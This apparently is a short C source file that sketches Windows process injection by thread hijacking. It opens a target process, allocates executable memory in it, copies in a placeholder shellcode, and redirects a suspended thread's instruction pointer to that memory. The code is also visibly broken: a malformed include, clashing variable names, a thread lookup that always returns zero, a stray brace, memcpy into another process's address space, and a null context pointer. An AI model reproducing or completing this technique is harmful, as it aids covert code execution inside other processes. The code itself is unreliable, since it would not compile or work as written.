#include <stdio.h>
#include <Windows>h>


DWORD get_th_id(DWORD pid){
	DWORD th_id=0;
	THREADENTRY te;
	HANDLE snap;
	
	snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
	
	if(snap == INVALID_HANDLE_VALUE){
		return -1;
	}
	
	te32.dwSize = sizeof(THREADENTRY);
	
	if( !Thread32First( snap, &te ) ) 
  {
    printError( TEXT("Thread32First") ); // show cause of failure
    CloseHandle( snap );          // clean the snapshot object
    return( FALSE );
	
  }
  
   do 
  { 
    if( te32.th32OwnerProcessID == pid )
    {
      _tprintf( TEXT("\n\n     THREAD ID      = 0x%08X"), te32.th32ThreadID ); 
      _tprintf( TEXT("\n     Base priority  = %d"), te32.tpBasePri ); 
      _tprintf( TEXT("\n     Delta priority = %d"), te32.tpDeltaPri ); 
      _tprintf( TEXT("\n"));
	  
	  return th_id;
    }
  } while( Thread32Next(snap, &te32 ) ); 

  CloseHandle( snap );
}
	
}

int main(){
	
	const char shellcode[] = ".....";
	
	HANDLE proc_handle = OpenProcess(PROCESS_ALL_ACCESS,NULL,1234);
	LPVOID base_addr = VirtualAllocEx(proc_handle,NULL,sizeof shellcode,MEM_COMMIT |MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	
	memcpy(base_addr,shellcode,sizeof shellcode);
	
	DWORD thread_id = get_th_id(1234);
	
	HANDLE thread_handle = OpenThread(THREAD_ALL_ACCESS,NULL,thread_id);
	
	SuspendThread(thread_handle);
	
	LPCONTEXT context = {0};
	
	GetThreadContext(thread_handle,context);
	
	context.Rip = (DWORD_PTR)base_addr;
	
	SetThreadContext(thread_handle,context);
	
	ResumeThread(thread_handle);
	
	return 0;
}